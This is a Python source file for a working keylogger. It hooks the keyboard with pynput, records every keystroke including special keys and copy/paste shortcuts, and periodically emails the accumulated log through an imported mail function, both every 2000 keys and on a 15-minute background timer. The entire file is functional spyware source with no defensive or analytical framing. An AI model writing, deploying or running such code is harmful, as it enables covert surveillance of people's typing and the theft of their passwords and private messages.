from pynput.keyboard import Listener
from mailservice import send_mail
from threading import Thread
from time import sleep


logString = ""
inputCounter = 0

def key_formatter(inputString):
    """A simple function that polishes the input characters before they get added to the logfile."""

    # Any misc key needs to be ignored or adjusted properly before being added to the logfile
    # Shift is not needed - the library automatically turns the specified letter in uppercase
    # While shift works properly, caps lock wont switch letters to uppercase

    if inputString.startswith("Key."):
        if inputString == "Key.enter":
            inputString = "\n"
        elif inputString == "Key.tab":
            inputString = "\t"
        elif inputString == "Key.space":
            inputString = " "
        elif inputString == "Key.backspace":
            inputString = "[BACKSPACE] "
        elif inputString == "Key.right":
            inputString = "[RIGHT_ARROW] "
        elif inputString == "Key.left":
            inputString = "[LEFT_ARROW] "
        elif inputString == "Key.up":
            inputString = "[UP_ARROW] "
        elif inputString == "Key.down":
            inputString = "[DOWN_ARROW] "

        elif inputString == "Key.insert":
            inputString = "[INSERT] "
        elif inputString == "Key.delete":
            inputString = "[DEL] "
        elif inputString == "Key.caps_lock":
            inputString = "[CAPS_LOCK] "

        # all other misc keys(CTRL, ALT, CMD, MEDIA KEYS and so on) are discarded
        else:
            inputString = ""

    # While logging, the script will keep track of any copy/paste/cut/undo operations.

    if inputString.startswith("\\x"): #CTRL codes
        if inputString == "\\x03":
            inputString = " CTRL_C " #copy
        elif inputString == "\\x16":
            inputString = " CTRL_V " #paste
        elif inputString == "\\x1a":
            inputString = " CTRL_Z " #undo
        elif inputString == "\\x18":
            inputString = " CTRL_X " #cut
        elif inputString == "\\x01":
            inputString = " CTRL_A " #select all
        elif inputString == "\\x19":
            inputString = " CTRL_Y " #redo
        
    return inputString


def log_keystroke(key):
    """This is the logging function: every keyboard input is read and added to the logfile."""
    global logString
    global inputCounter
    
    #After 2000 input keys, the logs will be sent through the mailing service script
    if inputCounter >= 2000:
        inputCounter = 0 #reset the counter
        send_mail(logString)
        logString = "" #reset the input (avoid duplicating the same string over and over)
    

    if str(key).count("'") == 2: #if its anything but a single quote
        inputString = str(key).replace("'", "") #remove single quotes surrounding the input
        inputString = key_formatter(inputString)
    else: #if its a single quote
        inputString = key_formatter(str(key).replace("\"", "")) #remove the double quotes surrounding the single quote
    logString = logString + inputString
    inputCounter = inputCounter + 1

def log_timer():
    """This function is used to send emails every 900 seconds."""
    global logString
    while True:
        sleep(900) # sleep for 15minutes before sending any emails
        send_mail(logString)
        logString = "" # after sending, reset the logstring


# start the thread that sends email every x seconds
thread = Thread(target = log_timer)
thread.start()

# The "with" keyword will automatically close the listener.
# It always makes sure that the memory allocated to it will be released, no matter what.
with Listener(on_press=log_keystroke) as l:
    l.join()


